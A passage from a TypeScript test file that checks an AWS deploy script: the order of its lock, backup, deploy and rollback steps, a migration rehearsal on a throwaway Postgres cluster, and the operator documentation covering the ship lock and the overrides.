  const order = [after('ssm_apply lock-take'), after('ssm_apply backup'), after('ssm_apply deploy'), after('ssm_apply static'), after('outside_checks "$FULL"'), after('gate health ok')];
  assert.deepEqual([...order].sort((a, b) => a - b), order);
  const back = src.slice(at('if [ "$ROLLBACK" = 1 ]; then\n  STAGE=rollback'), from);
  const rb = ['ssm_read status', 'ssm_apply lock-take', 'ssm_apply rollback', 'ssm_apply static', 'outside_checks "$FULL"'].map((t) => back.indexOf(t));
  assert.ok(rb.every((i) => i > 0), `the rollback is missing a step: ${rb}`);
  assert.deepEqual([...rb].sort((a, b) => a - b), rb);
  assert.doesNotMatch(back, /ssm_apply (backup|deploy) /, 'a rollback is not a deploy and moves no schema');
  assert.match(src, /SHIP_LOCK=\/run\/lock\/raw-host-ship\.lock/);
  assert.match(src, /DEPLOY_LOCK=\/run\/lock\/raw-host-deploy\.lock/, 'the flock deploy.sh and Alembic\'s deploy-sha.sh take');
  assert.match(readFileSync(join(ROOT, 'infra/aws/deploy.sh'), 'utf8'), /\/run\/lock\/raw-host-deploy\.lock/);
});

test('the migration rehearsal starts from the deployed commit, runs this commit twice, and stops its database by PID', () => {
  const d = src.slice(src.indexOf('rehearse() {'), src.indexOf('run_gate "migrations forward"'));
  const steps = ['cd "$BASE_WT" && "${menv[@]}" pnpm db:migrate', 'pnpm db:seed', 'cd "$HEAD_WT" && "${menv[@]}" pnpm db:migrate', 'a second db:migrate must apply nothing', 'pnpm db:validate'];
  const idx = steps.map((s) => d.indexOf(s));
  assert.ok(idx.every((i) => i > 0), `missing a step: ${idx}`);
  assert.deepEqual([...idx].sort((a, b) => a - b), idx);
  // The same shape each box's migrate unit has, so a block for the other database is never applied.
  assert.match(d, /SKIP_TARGETS=main/);
  assert.match(d, /SKIP_TARGETS=formula DB_APP_ROLE=ship_app/);
  assert.match(read('infra/aws/env/render-env.sh'), /^SKIP_TARGETS=formula$/m);
  assert.match(read('infra/aws/env/render-env.sh'), /^SKIP_TARGETS=main$/m);
  // It runs because the schema changed (touched-tests.mjs `migrations`), or because it was asked for.
  assert.match(src, /if \[ "\$MIGRATIONS" = 1 \] \|\| \[ "\$FORCE_MIG" = 1 \]; then/);
  // With no locale in the environment the postmaster on macOS refuses to start; the first real run died there.
  assert.match(src, /pgenv=\(env LC_ALL=en_US\.UTF-8 LANG=en_US\.UTF-8\)/);
  assert.equal([...src.matchAll(/"\$\{pgenv\[@\]\}" "\$PG_BIN\/(initdb|pg_ctl)"/g)].length, 2);
  // The throwaway cluster: never adopted, stopped by PID on every exit, never by name.
  assert.match(src, /port \$PG_PORT is already listening and this run did not start it/);
  const finish = src.slice(src.indexOf('finish() {'), src.indexOf('trap finish EXIT'));
  assert.match(finish, /pg_stop/);
  assert.match(src, /pg_ctl" -D "\$PGDATA" -m immediate -w -t 30 stop > \/dev\/null 2>&1 \|\| kill "\$PG_PID"/);
});

function read(p: string) { return readFileSync(join(ROOT, p), 'utf8'); }

test('DEPLOY_AWS.md tells the operator about ship.sh, the lock and the override', () => {
  const doc = read('infra/aws/DEPLOY_AWS.md');
  assert.match(doc, /## 7a\. `infra\/aws\/ship\.sh`/);
  assert.match(doc, /\/run\/lock\/raw-host-ship\.lock/);
  assert.match(doc, /ship\.sh --unlock/);
  assert.match(doc, /fast-proof-always\.txt/);
  assert.match(doc, /ship\.sh --rollback --apply/);
  assert.match(doc, /infra\/aws\/nightly-proof\.sh/);
  // Alembic's ship.sh reads the ship lock and never writes it (its own header says so).
  assert.doesNotMatch(doc, /takes the same\s+file with `system=alembic`/);
});
